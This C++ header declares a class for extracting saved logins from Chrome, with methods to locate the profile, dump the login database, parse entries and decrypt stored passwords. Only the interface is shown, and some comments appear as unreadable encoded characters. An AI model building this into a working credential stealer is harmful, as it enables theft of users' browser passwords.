#pragma once
//#include <stdint.h> 
#include <queue>
using namespace std;

struct chp_entry {
	wchar_t service[64];
	wchar_t resource[255];
	wchar_t user_name[255];
	wchar_t user_value[255];
	wchar_t pass_name[255];
	wchar_t pass_value[255];
};

//�������������Ľṹ��
struct get_Chrome {
	wchar_t url[255];
	wchar_t user_name[255];
	wchar_t pass_name[255];

};


class CChrome
{
public:
	CChrome();
	~CChrome();

public:
	//��ȡ�����û���
	int DumpChrome(void);
	int DirectoryExists(wchar_t *path);
	char *GetDosAsciiName(wchar_t *orig_path);
	char *HM_CompletePath(char *file_name, char *buffer);
	static int DecryptPass(char *cryptData, wchar_t *clearData, int clearSize);
	static int parse_chrome_signons(void *param, int argc, char **argv, char **azColName);
	int DumpSqlCH(wchar_t *profilePath, wchar_t *signonFile);
	wchar_t *GetCHProfilePath();
	
public:
	//�������
	queue<get_Chrome> pCH;
};